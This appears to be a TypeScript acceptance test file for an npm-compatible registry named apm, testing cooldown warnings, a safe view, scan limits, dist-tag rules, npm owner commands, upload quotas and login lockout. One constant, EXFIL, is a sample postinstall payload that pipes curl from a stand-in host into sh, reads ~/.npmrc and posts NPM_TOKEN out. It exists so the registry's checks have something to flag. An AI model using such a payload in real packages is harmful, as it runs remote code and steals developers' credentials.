// Spec (bug hunt before launch): apm routes and npm protocol details that were broken at 7f672da.
// Each test reproduces one finding against the real registry and the stock npm client.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync, readdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  startRegistry,
  startFakeGitHub,
  signInWithGitHub,
  enableTotp,
  deviceLogin,
  totp,
  addUser,
  makeSandbox,
  putPublish,
  run,
  getJson,
  dig,
  ROOT,
  type Registry,
  type FakeGitHub,
  type RawManifest,
} from "./harness";

const MINUTE = 60_000;
const HOUR = 60 * MINUTE;
const DAY = 24 * HOUR;
const PASSWORD = "correct-horse-battery";
const EXFIL = "require('child_process').execSync('curl https://example.invalid | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://example.invalid',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n";
let clock = Date.parse("2026-10-01T00:00:00Z");

async function publishOk(reg: Registry, token: string, manifest: RawManifest, opts: Parameters<typeof putPublish>[3] = {}): Promise<void> {
  const r = await putPublish(reg, token, { license: "MIT", main: "index.js", ...manifest }, opts);

  if (r.status !== 201) throw new Error(`publish ${manifest.name}@${manifest.version}: ${r.status} ${JSON.stringify(r.body)}`);
}

function raw(method: string, body: string, token?: string): RequestInit {
  const headers = new Headers({ "content-type": "application/json" });

  if (token) headers.set("authorization", `Bearer ${token}`);

  return { method, headers, body };
}

type Json = string | number | boolean | null | Json[] | { [key: string]: Json };

function json(method: string, body: { [key: string]: Json }, token?: string): RequestInit {
  return raw(method, JSON.stringify(body), token);
}

// ---------- apm routes ----------
describe("the dependency tree is checked the way npm installs it", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
    await publishOk(reg, alice, { name: "tagged-dep", version: "1.0.0" });
    await publishOk(reg, alice, { name: "tagged-dep", version: "2.0.0-beta.1", scripts: { postinstall: "node x.js" } }, { files: { "index.js": "1;\n", "x.js": EXFIL }, tags: { next: "2.0.0-beta.1" } });
    await publishOk(reg, alice, { name: "tag-app", version: "1.0.0", dependencies: { "tagged-dep": "next" } });
    await publishOk(reg, alice, { name: "cool-app", version: "1.0.0", dependencies: { "hot-dep": "^1.0.0" } });
    clock += 2 * DAY;
    await publishOk(reg, alice, { name: "hot-dep", version: "1.0.0" });
    clock += 1 * HOUR;
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("a dependency on a dist-tag is checked at the version the tag points to", async () => {
    // strict mode refuses it; the default installs, warning about the version the tag points to
    const r = await getJson(`${reg.url}-/apm/v1/resolve?name=tag-app&strict=1`);
    expect(r.status, JSON.stringify(r.body)).toBe(422);
    expect(JSON.stringify(dig(r.body, "tree", "blocks"))).toContain("2.0.0-beta.1");
    const warned = await getJson(`${reg.url}-/apm/v1/resolve?name=tag-app`);
    expect(warned.status, JSON.stringify(warned.body)).toBe(200);
    expect(dig(warned.body, "warnings", 0, "version")).toBe("2.0.0-beta.1");
  });

  // review of 2fbf383, finding 1: the package manager installs the fresh dependency whatever its age, so it is checked
  // and warned about; strict mode refuses it, as every mode did before
  test("a dependency published inside the cooldown is a warning, and strict mode refuses it", async () => {
    const r = await getJson(`${reg.url}-/apm/v1/resolve?name=cool-app`);
    expect(r.status, JSON.stringify(r.body)).toBe(200);
    const warnings = JSON.stringify(dig(r.body, "warnings"));
    expect(warnings).toContain('"name":"hot-dep","version":"1.0.0"');
    expect(warnings).toContain("inside apm's 24-hour cooldown");
    expect(JSON.stringify(dig(r.body, "tree", "packages"))).toContain('"name":"hot-dep"');
    const strict = await getJson(`${reg.url}-/apm/v1/resolve?name=cool-app&strict=1`);
    expect(strict.status, JSON.stringify(strict.body)).toBe(422);
    const blocks = JSON.stringify(dig(strict.body, "tree", "blocks"));
    expect(blocks).toContain('"name":"hot-dep","version":"1.0.0"');
    expect(blocks).toMatch(/cooldown/);
    const lifted = await getJson(`${reg.url}-/apm/v1/resolve?name=cool-app&cooldown=0`);
    expect(lifted.status).toBe(200);
    expect(JSON.stringify(dig(lifted.body, "warnings"))).not.toContain("cooldown");
  });

  test("a floor or cooldown that is not a number of zero or more is a 400, not a pass", async () => {
    for (const q of ["floor=abc", "floor=-1", "floor=", "floor=4O", "cooldown=abc", "cooldown=-2h"]) {
      const r = await getJson(`${reg.url}-/apm/v1/resolve?name=tag-app&${q}`);
      expect(r.status, q).toBe(400);
    }

    expect((await getJson(`${reg.url}-/apm/v1/resolve?name=tag-app&floor=40&strict=1`)).status).toBe(422);
  });
});

describe("scan without a token is bounded", () => {
  let reg: Registry;
  let alice: string;
  let slow: ReturnType<typeof Bun.serve>;
  let slowReg: Registry;
  let inFlight = 0;
  let maxInFlight = 0;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
    slow = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      async fetch() {
        inFlight++;
        maxInFlight = Math.max(maxInFlight, inFlight);
        await Bun.sleep(150);
        inFlight--;

        return Response.json({ error: "Not found" }, { status: 404 });
      },
    });
    slowReg = await startRegistry({ now: () => clock, upstream: slow.url.toString() });
  });
  afterAll(async () => {
    await reg?.stop();
    await slowReg?.stop();
    slow?.stop(true);
  });

  test("an anonymous scan checks at most 200 packages and lists the rest as unchecked", async () => {
    const packages = Array.from({ length: 201 }, (_, i) => ({ name: `never-${i}`, version: "1.0.0" }));
    const anon = await getJson(`${reg.url}-/apm/v1/scan`, json("POST", { packages }));
    expect(anon.status).toBe(200);
    const unchecked = dig(anon.body, "unchecked");
    expect(Array.isArray(unchecked) ? unchecked.length : 0).toBe(201);
    expect(JSON.stringify(unchecked)).toMatch(/never-200[^}]*sign in|never-200[^}]*token/i);
    const signedIn = await getJson(`${reg.url}-/apm/v1/scan`, json("POST", { packages }, alice));
    expect(JSON.stringify(dig(signedIn.body, "unchecked"))).not.toMatch(/sign in|token/i);
  });

  test("upstream lookups run a few at a time, not one after another", async () => {
    const packages = Array.from({ length: 12 }, (_, i) => ({ name: `slow-${i}`, version: "1.0.0" }));
    const t0 = performance.now();
    const r = await getJson(`${slowReg.url}-/apm/v1/scan`, json("POST", { packages }));
    const elapsed = performance.now() - t0;
    expect(r.status).toBe(200);
    expect(maxInFlight).toBeGreaterThan(1);
    expect(maxInFlight).toBeLessThanOrEqual(8);
    expect(elapsed).toBeLessThan(12 * 150);
  });
});

describe("scans reuse stored analyses", () => {
  let upstream: Registry;
  let proxy: ReturnType<typeof Bun.serve>;
  let reg: Registry;
  let tarballFetches = 0;
  beforeAll(async () => {
    upstream = await startRegistry({ now: () => clock });
    const tok = await addUser(upstream, "upalice", PASSWORD);
    await publishOk(upstream, tok, { name: "cached-up", version: "1.0.0" });
    // forwards to the upstream registry, counting tarball downloads; packuments point their tarballs back here
    proxy = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      async fetch(req) {
        const u = new URL(req.url);
        const res = await fetch(`${upstream.url}${u.pathname.slice(1)}${u.search}`, { headers: { accept: req.headers.get("accept") ?? "*/*" } });

        if (u.pathname.endsWith(".tgz")) {
          tarballFetches++;

          return new Response(await res.arrayBuffer(), { status: res.status });
        }

        const text = (await res.text()).replaceAll(upstream.url, proxy.url.toString());

        return new Response(text, { status: res.status, headers: { "content-type": res.headers.get("content-type") ?? "application/json" } });
      },
    });
    reg = await startRegistry({ now: () => clock, upstream: proxy.url.toString(), upstreamTtlMs: 0 });
  });
  afterAll(async () => {
    await reg?.stop();
    await upstream?.stop();
    proxy?.stop(true);
  });

  test("a second scan of the same upstream version downloads nothing", async () => {
    const body = { packages: [{ name: "cached-up", version: "1.0.0" }] };
    // an anonymous scan analyses nothing itself: the version is queued, and nothing is downloaded for it here
    const before = tarballFetches;
    const anonymous = await getJson(`${reg.url}-/apm/v1/scan`, json("POST", body));
    expect(anonymous.status).toBe(200);
    expect(JSON.stringify(anonymous.body)).toContain("queued");
    expect(tarballFetches).toBe(before);
    // the queue's run analyses it once (no request analyses inline, signed in or not); every later scan, anonymous or
    // not, reuses the stored analysis
    const tok = await addUser(reg, "scanner", PASSWORD);
    let scanned = await getJson(`${reg.url}-/apm/v1/scan`, json("POST", body, tok));

    for (let i = 0; i < 60 && JSON.stringify(dig(scanned.body, "pending")) !== "[]"; i++) {
      await Bun.sleep(250);
      scanned = await getJson(`${reg.url}-/apm/v1/scan`, json("POST", body, tok));
    }

    expect(dig(scanned.body, "pending")).toEqual([]);
    const after = tarballFetches;
    expect(after).toBe(before + 1);
    expect((await getJson(`${reg.url}-/apm/v1/scan`, json("POST", body))).status).toBe(200);
    expect(tarballFetches).toBe(after);
  });
});

describe("the ~safe view covers every route", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
    await publishOk(reg, alice, { name: "settled", version: "1.0.0" });
    clock += 2 * DAY;
    await publishOk(reg, alice, { name: "settled", version: "1.1.0" });
    await publishOk(reg, alice, { name: "brand-new", version: "1.0.0" });
    clock += 1 * HOUR;
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("a version the safe view hides is not served by its version or tarball route either", async () => {
    expect((await getJson(`${reg.url}~safe/brand-new/1.0.0`)).status).toBe(404);
    expect((await fetch(`${reg.url}~safe/brand-new/-/brand-new-1.0.0.tgz`)).status).toBe(404);
    expect((await fetch(`${reg.url}~safe/settled/-/settled-1.1.0.tgz`)).status).toBe(404);
    expect((await getJson(`${reg.url}brand-new/1.0.0`)).status).toBe(200);
    expect((await fetch(`${reg.url}brand-new/-/brand-new-1.0.0.tgz`)).status).toBe(200);
  });

  test("the safe view hands out tarball URLs inside the safe view", async () => {
    const p = await getJson(`${reg.url}~safe/settled`);
    const url = String(dig(p.body, "versions", "1.0.0", "dist", "tarball"));
    expect(url).toBe(`${reg.url}~safe/settled/-/settled-1.0.0.tgz`);
    expect((await fetch(url)).status).toBe(200);
    const doc = await getJson(`${reg.url}~safe/settled/latest`);
    expect(doc.status).toBe(200);
    expect(dig(doc.body, "version")).toBe("1.0.0");
    expect(String(dig(doc.body, "dist", "tarball"))).toContain("/~safe/");
  });
});

// ---------- npm protocol ----------
describe("dist-tags", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
    await publishOk(reg, alice, { name: "okpkg", version: "1.0.0" });
    await publishOk(reg, alice, { name: "okpkg", version: "1.1.0" });
  });
  afterAll(async () => {
    await reg?.stop();
  });

  const setTag = (tag: string, body: string): Promise<{ status: number; body: unknown }> => getJson(`${reg.url}-/package/okpkg/dist-tags/${encodeURIComponent(tag)}`, raw("PUT", body, alice));

  test("a tag named like a version or a range, or with other characters, is refused", async () => {
    for (const tag of ["2.0.0", "1.0.0", "^1", ">=1", "v1.2.3", "bad tag", "-x", ".x", "x".repeat(200)]) {
      expect((await setTag(tag, '"1.0.0"')).status, tag).toBe(400);
    }

    expect((await setTag("beta", '"1.0.0"')).status).toBe(200);
    expect((await getJson(`${reg.url}okpkg/2.0.0`)).status).toBe(404);
  });

  test("a publish whose dist-tag looks like a version is refused", async () => {
    const r = await putPublish(reg, alice, { name: "okpkg", version: "1.2.0", license: "MIT", main: "index.js" }, { tags: { "1.2.0": "1.2.0" } });
    expect(r.status).toBe(400);
  });

  test("a malformed dist-tag body is a 400", async () => {
    for (const body of ["{}", "not json", "null", "42"]) expect((await setTag("gamma", body)).status, body).toBe(400);
  });

  test("names inherited from Object.prototype are not dist-tags", async () => {
    for (const spec of ["toString", "constructor", "__proto__", "hasOwnProperty", "valueOf"]) {
      expect((await getJson(`${reg.url}okpkg/${spec}`)).status, spec).toBe(404);
      expect((await getJson(`${reg.url}-/apm/v1/score/okpkg/${spec}`)).status, spec).toBe(404);
      const r = await getJson(`${reg.url}-/apm/v1/resolve?name=okpkg&range=${spec}`);
      expect(r.status, spec).toBeLessThan(500);
    }
  });
});

describe("metadata updates say what they changed", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
    await publishOk(reg, alice, { name: "meta-pkg", version: "1.0.0" });
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("deprecating a version that does not exist is a 404", async () => {
    const r = await getJson(`${reg.url}meta-pkg`, json("PUT", { name: "meta-pkg", versions: { "9.9.9": { deprecated: "x" } } }, alice));
    expect(r.status).toBe(404);
    expect(JSON.stringify(r.body)).toContain("9.9.9");
  });

  test("a metadata update with no versions is a 400", async () => {
    expect((await getJson(`${reg.url}meta-pkg`, json("PUT", { name: "meta-pkg", versions: {} }, alice))).status).toBe(400);
    expect((await getJson(`${reg.url}meta-pkg`, json("PUT", { name: "meta-pkg" }, alice))).status).toBe(400);
  });

  test("an update lists the versions it changed, and none when nothing changed", async () => {
    const first = await getJson(`${reg.url}meta-pkg`, json("PUT", { name: "meta-pkg", versions: { "1.0.0": { deprecated: "use 2" } } }, alice));
    expect(first.status).toBe(200);
    expect(dig(first.body, "updated")).toEqual(["1.0.0"]);
    const again = await getJson(`${reg.url}meta-pkg`, json("PUT", { name: "meta-pkg", versions: { "1.0.0": { deprecated: "use 2" } } }, alice));
    expect(again.status).toBe(200);
    expect(dig(again.body, "updated")).toEqual([]);
  });
});

describe("stock npm owner and unpublish", () => {
  let gh: FakeGitHub;
  let reg: Registry;
  let secret: string;
  let token: string;
  beforeAll(async () => {
    gh = startFakeGitHub();
    reg = await startRegistry({ now: () => clock, github: gh });
    const octo = await signInWithGitHub(reg, gh, "octo");
    secret = await enableTotp(octo);
    await deviceLogin(octo);
    token = await reg.mintToken({ user: "octo", scope: "publish" });
    await reg.mintToken({ user: "bob", scope: "publish" });
    await reg.mintToken({ user: "carol", scope: "publish" });
    await publishOk(reg, token, { name: "owned-pkg", version: "1.0.0" });
    await publishOk(reg, token, { name: "owned-pkg", version: "1.1.0" });
  });
  afterAll(async () => {
    await reg?.stop();
    await gh?.stop();
  });

  const npm = async (args: string[]): Promise<{ code: number; out: string }> => {
    const sb = makeSandbox(reg, token);

    return run(["npm", ...args, "--registry", reg.url], { cwd: sb.home, env: sb.env });
  };

  const owners = async (): Promise<string[]> => {
    const list = dig((await getJson(`${reg.url}-/apm/v1/packages/owned-pkg`)).body, "maintainers");

    return Array.isArray(list) ? list.map(String) : [];
  };

  test("npm owner ls lists the owners", async () => {
    const r = await npm(["owner", "ls", "owned-pkg"]);
    expect(r.code, r.out).toBe(0);
    expect(r.out).toContain("octo");
  });

  test("npm owner add and rm work with --otp", async () => {
    const add = await npm(["owner", "add", "bob", "owned-pkg", `--otp=${totp(secret)}`]);
    expect(add.code, add.out).toBe(0);
    expect(await owners()).toEqual(["bob", "octo"]);
    const rm = await npm(["owner", "rm", "bob", "owned-pkg", `--otp=${totp(secret)}`]);
    expect(rm.code, rm.out).toBe(0);
    expect(await owners()).toEqual(["octo"]);
  });

  test("npm owner add without a code is refused and asks for one", async () => {
    const r = await npm(["owner", "add", "carol", "owned-pkg"]);
    expect(r.code).not.toBe(0);
    expect(r.out).toMatch(/OTP|one-time/i);
    expect(await owners()).toEqual(["octo"]);
  });

  test("npm unpublish is refused with a pointer to apm yank and apm revoke", async () => {
    for (const spec of ["owned-pkg@1.0.0", "owned-pkg"]) {
      const r = await npm(["unpublish", spec, "--force"]);
      expect(r.code, spec).not.toBe(0);
      expect(r.out, spec).toMatch(/apm yank/);
      expect(r.out, spec).toMatch(/apm revoke/);
    }

    expect((await getJson(`${reg.url}owned-pkg/1.0.0`)).status).toBe(200);
    expect((await getJson(`${reg.url}owned-pkg/1.1.0`)).status).toBe(200);
  });
});

describe("staged uploads have quotas", () => {
  let gh: FakeGitHub;
  let reg: Registry;
  let stage: string;
  beforeAll(async () => {
    gh = startFakeGitHub();
    reg = await startRegistry({ now: () => clock, github: gh });
    const b = await signInWithGitHub(reg, gh, "stager");
    await enableTotp(b);
    stage = (await deviceLogin(b)).token;
  });
  afterAll(async () => {
    await reg?.stop();
    await gh?.stop();
  });

  test("one package holds at most 5 versions waiting for approval", async () => {
    for (let i = 0; i < 5; i++) {
      const r = await putPublish(reg, stage, { name: "staged-one", version: `1.0.${i}`, license: "MIT", main: "index.js" });
      expect(r.status, JSON.stringify(r.body)).toBe(202);
    }

    const over = await putPublish(reg, stage, { name: "staged-one", version: "1.0.5", license: "MIT", main: "index.js" });
    expect(over.status).toBe(429);
    expect(JSON.stringify(over.body)).toMatch(/waiting/i);
  });

  test("one account holds at most 20 versions waiting for approval", async () => {
    for (let i = 0; i < 15; i++) {
      const r = await putPublish(reg, stage, { name: `staged-many-${i}`, version: "1.0.0", license: "MIT", main: "index.js" });
      expect(r.status, JSON.stringify(r.body)).toBe(202);
    }

    const over = await putPublish(reg, stage, { name: "staged-many-x", version: "1.0.0", license: "MIT", main: "index.js" });
    expect(over.status).toBe(429);
  });
});

describe("password attempts are limited", () => {
  let reg: Registry;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
  });
  afterAll(async () => {
    await reg?.stop();
  });

  const login = (name: string, password: string): Promise<{ status: number; body: unknown }> =>
    getJson(`${reg.url}-/user/org.couchdb.user:${name}`, json("PUT", { _id: `org.couchdb.user:${name}`, name, password, type: "user", roles: [] }));

  test("a legacy login locks after 10 wrong passwords, also for the right one, until the window passes", async () => {
    await addUser(reg, "victim", PASSWORD);

    for (let i = 0; i < 10; i++) expect((await login("victim", `wrong-${i}-password`)).status).toBe(401);
    expect((await login("victim", "wrong-again-password")).status).toBe(429);
    expect((await login("victim", PASSWORD)).status).toBe(429);
    clock += 16 * MINUTE;
    expect((await login("victim", PASSWORD)).status).toBe(201);
  });

  test("the password second factor locks the same way", async () => {
    const tok = await addUser(reg, "stepper", PASSWORD);
    await publishOk(reg, tok, { name: "stepper-pkg", version: "1.0.0" });
    const revoke = (password: string): Promise<{ status: number; body: unknown }> => getJson(`${reg.url}-/apm/v1/revoke`, json("POST", { name: "stepper-pkg", version: "1.0.0", reason: "test", password }, tok));

    for (let i = 0; i < 10; i++) expect((await revoke(`wrong-${i}-password`)).status).toBe(401);
    expect((await revoke(PASSWORD)).status).toBe(429);
  });
});

// ---------- test harness hygiene ----------
describe("test runs clean up after themselves", () => {
  test("sandboxes and registry data dirs are gone when a test process exits", async () => {
    const tmp = mkdtempSync(join(tmpdir(), "hygiene-tmp-"));
    const dir = mkdtempSync(join(tmpdir(), "hygiene-test-"));
    const harness = join(ROOT, "tests", "acceptance", "harness.ts");
    writeFileSync(
      join(dir, "leak.test.ts"),
      [
        `import { test, expect } from "bun:test";`,
        `import { mkdtempSync } from "node:fs";`,
        `import { tmpdir } from "node:os";`,
        `import { join } from "node:path";`,
        `import { startRegistry, makeSandbox, writePackage } from ${JSON.stringify(harness)};`,
        `test("makes sandboxes", async () => {`,
        `  const reg = await startRegistry();`,
        `  makeSandbox(reg);`,
        `  writePackage(mkdtempSync(join(tmpdir(), "apm-work-")), { name: "x", version: "1.0.0" }, reg);`,
        `  await reg.stop();`,
        `  expect(true).toBe(true);`,
        `});`,
      ].join("\n"),
    );
    const inherited = Object.entries(process.env).flatMap(([k, v]) => (v === undefined || k === "TMPDIR" ? [] : [[k, v] as const]));
    const env = Object.fromEntries([...inherited, ["TMPDIR", tmp] as const]);
    const r = await run(["bun", "test", "./leak.test.ts"], { cwd: dir, env });
    expect(r.code, r.out).toBe(0);

    // the cleanup runs as the test process exits; give it a moment
    for (let i = 0; i < 50 && readdirSync(tmp).length > 0; i++) await Bun.sleep(100);
    expect(readdirSync(tmp)).toEqual([]);
  });
});
